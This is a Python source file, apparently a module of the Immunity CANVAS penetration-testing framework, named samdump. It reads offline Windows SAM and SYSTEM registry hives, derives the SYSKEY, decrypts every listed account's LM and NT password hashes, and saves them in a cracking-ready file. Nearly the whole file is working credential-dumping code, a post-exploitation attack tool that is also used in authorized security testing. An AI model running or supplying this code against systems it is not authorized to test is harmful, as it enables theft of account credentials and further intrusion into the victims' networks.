#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  samdump.py
## Description:
##            :
## Created_On :  Fri Dec 14 2018
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localexploit import LocalExploit
from canvaserror import NodeCommandError
from exploitutils import *
from ExploitTypes.localcommand import LocalCommand

NAME                            = "samdump"
DESCRIPTION                     = "Extracts the LM/NT hashes out of the combination of the SAM and SYSTEM hives."

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
Tested on Windows XP (sp3), 7, 2008, 2012 and 2016.

Note: This module is similar to:
- samdump2{-linux}: https://directory.fsf.org/wiki/Samdump2
- pwdump: https://github.com/moyix/creddump
"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Commands'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ 'XP', '7', '2008', '2012', '8.1', '10', '2016' ]

# Necessary to import & decrypt the hashes.
import libs.libwincreds.libwincreds as libwincreds
import libs.libwinreg.libwinreg as libwinreg

SAM_USERNAMES_PATH      = 'SAM\\Domains\\Account\\Users\\Names'
SAM_ACCOUNT_PATH        = 'SAM\\Domains\\Account'
SYSTEM_CONTROL_LSA_PATH = '\\ControlSet%03d\\Control\\Lsa'
SELECT_PATH             = '\\Select'

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result        = []
        self.name          = NAME
        self.savefile      = "passwordhashes.txt"
        self.sam_file      = ''
        self.system_file   = ''
        self.sam_parser    = None
        self.system_parser = None
        self.userlist      = []
        self.syskey        = ''
        self.classes       = {}
        self.F             = None
        self.john_file     = ''

    def getargs(self):
        """
        Parsing of CLI/GUI arguments.
        """
        self.savefile = self.argsDict.get("savefile", self.savefile)
        self.sam_file = self.argsDict.get("sam_file", self.sam_file)
        self.system_file = self.argsDict.get("system_file", self.system_file)

        if not self.sam_file or not self.system_file:
            logging.error('You must specify both paths')
            return 0

        try:
            self.sam_parser = libwinreg.WinRegParser(self.sam_file)
            self.system_parser = libwinreg.WinRegParser(self.system_file)
        except Exception as e:
            logging.error('Could not initialize the reg parsers: %s' % str(e))
            return 0

        return 1

    def get_user_list(self):
        """
        Get All Users using the LSASRV API.
        Returns a list of user/sid
        """

        try:
            cell_sdaun = self.sam_parser.get_keynode_by_name(SAM_USERNAMES_PATH)
            skeys = self.sam_parser.get_subkeys(cell_sdaun.get_data())
            for subk in skeys:
                user_name = subk.get_data().get_keyname()
                path = '\\'.join([SAM_USERNAMES_PATH, user_name])
                cell_username = self.sam_parser.get_keynode_by_name(path)
                values = self.sam_parser.get_values(cell_username.get_data())

                if len(values) != 1:
                    logging.warning('More than one value, this is suspicious!')

                rid = values[0].get_data().get_data_type()
                self.userlist.append({'rid': rid, 'username': user_name})

        except Exception as e:
            logging.warning('get_user_list() encountered a parsing error, this might not be fatal.')

    def get_control_index(self):
        """
        Returns the interger value within \\Select\\Current
        """

        try:
            cell_select = self.system_parser.get_keynode_by_name(SELECT_PATH)
            if not cell_select:
                logging.error('Could not open %s!' % SELECT_PATH)
                return -1

            current_cell = self.system_parser.get_keyvalue_by_name(cell_select.get_data(), 'Current')
            current_data = self.system_parser.get_rawdata_from_keyvalue(current_cell.get_data())
            return struct.unpack('<L', current_data)[0]

        except Exception as e:
            logging.warning('get_control_index() encountered a parsing error, this might not be fatal: %s', str(e))
            return -1

    def get_syskey(self, idx_control):
        """
        Retrieves the encrypted SYSKEY.
        """

        try:

            control_path = SYSTEM_CONTROL_LSA_PATH % idx_control
            cell_lsa = self.system_parser.get_keynode_by_name(control_path)
            if not cell_lsa:
                logging.error('Could not open %s!' % control_path)
                return

            lsa_subkeys = self.system_parser.get_subkeys(cell_lsa.get_data())
            for subkey in lsa_subkeys:
                if subkey.get_data().get_keyname() in [ 'JD', 'Skew1', 'GBG', 'Data' ]:
                    class_data = self.system_parser.get_class_from_keynode(subkey.get_data())
                    self.classes[subkey.get_data().get_keyname()] = class_data.decode('utf-16-le').decode('hex')

            self.syskey = libwincreds.ExtractSysKey(self.classes['JD'],
                                                    self.classes['Skew1'],
                                                    self.classes['GBG'],
                                                    self.classes['Data'])

        except Exception as e:
            logging.error('get_syskey() failed: %s' % str(e))


    def get_F(self):
        """
        Retrieves the global variable F. This will be used to decrypt the bootkey.
        """

        try:
            cell_parentnode = self.sam_parser.get_keynode_by_name(SAM_ACCOUNT_PATH)
            cell_val = self.sam_parser.get_keyvalue_by_name(cell_parentnode.get_data(), 'F')
            self.F = self.sam_parser.get_rawdata_from_keyvalue(cell_val.get_data())
        except Exception as e:
            logging.error('get_F() failed: %s' % str(e))


    def get_V(self):
        """
        For each user we need to retrieve an encrypted user struct containing hashes.
        """

        logging.info('Attempting to retrieve the encrypted user struct for each user')
        for user in self.userlist:

            try:
                cell_sam_domains_account = self.sam_parser.get_keynode_by_name('SAM\\Domains\\Account\\Users\\' + ('%.8x' % user['rid']).upper())
                cell_val = self.sam_parser.get_keyvalue_by_name(cell_sam_domains_account.get_data(), 'V')
                V = self.sam_parser.get_rawdata_from_keyvalue(cell_val.get_data())
                user['V'] = V
            except Exception as e:
                logging.error('Failed to retrieve encrypted user struct for user %s' % user['username'])
                continue
            else:
                logging.info('Successfully retrieved encrypted user struct for user %s' % user['username'])
                logging.debug('F [len=%d]: %s' % (len(V), V.encode('hex')))


    def get_hashes(self):
        """
        For each user we may now proceed to the decryption of the credentials.
        """

        for user in self.userlist:
            for pt in ['LM','NT']:
                ret, h = libwincreds.DecryptHashFromSamDomainAccount(
                                self.syskey,
                                user['rid'],
                                self.F,
                                user['V'],
                                password_type=pt)

                if pt == 'LM':
                    if len(h):
                        user['lm_hash'] = h
                    else:
                        user['lm_hash'] = 'aad3b435b51404eeaad3b435b51404ee'.decode('hex')
                else:
                    if len(h):
                        user['ntlm_hash'] = h
                    else:
                        user['ntlm_hash'] = '31d6cfe0d16ae931b73c59d7e0c089c0'.decode('hex')


    def save_hashes(self):
        """
        Saves the hashes within a file.
        """

        # We may need to save these credentials
        save_loc = os.path.join(self.savepath, self.savefile)

        try:
            fd = open(save_loc,"ab")
            fd.write(self.john_file)
            fd.close()
        except Exception as e:
            logging.warning('Could not save the password hashes in %s' % save_loc)
        else:
            logging.info("Saved password hashes to: %s" % save_loc)


    def dump_hashes(self):
        """
        This function dumps hashes.
        """

        self.john_file = ''
        for user in self.userlist:
            line = '%s:%s:%s:%s:::' % (user['username'], user['rid'], user['lm_hash'].encode('hex'), user['ntlm_hash'].encode('hex'))
            logging.info(line)
            self.john_file += '%s\n' % line

    def save_results(self):
        """
        Saves the important results from this module for any caller.
        """

        for user in self.userlist:
            del user['V']
            self.result.append(user)

    def run(self):

        self.setInfo("%s" % NAME)
        if not self.getargs():
            return 0

        # We need a directory to save results
        self.savepath = self.output(subdir="PasswordHashes")

        # Retrieving the user list
        logging.info("Checking all users")
        self.get_user_list()
        if not self.userlist:
            logging.error("No users found, aborting Hashdump attack.")
            return 0

        logging.info("Found %d valid users:" % len(self.userlist))
        for user in self.userlist:
            logging.info('RID:%s, Username:%s' % (user['rid'], user['username']))

        idx_ctrl = self.get_control_index()
        if idx_ctrl == -1:
            logging.warning('Could not retrieve the control index, assuming 1 just in case.')
            idx_ctrl = 1

        self.get_syskey(idx_ctrl)
        if not self.syskey:
            logging.error('Could not retrieve the SYSKEY')
            return 0

        logging.info('Successfully retrieved the SYSKEY')
        logging.debug('syskey: %s' % self.syskey.encode('hex'))

        self.get_F()
        if not self.F:
            logging.error('Could not retrieve F')
            return 0

        logging.info('Successfully retrieved F')
        logging.debug('F [len=%d]: %s' % (len(self.F), self.F.encode('hex')))

        # For each user we need to retrieve the encrypted user struct
        self.get_V()

        # For each user, we attempt to retrieve the hash.
        self.get_hashes()
        # We then dump the hashes in the console and save them within a file.
        self.dump_hashes()
        self.save_hashes()
        self.save_results()

        self.setProgress(100)
        self.setInfo("%s - done (success: %s)" % (NAME, "%d users found" % len(self.userlist)))
        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
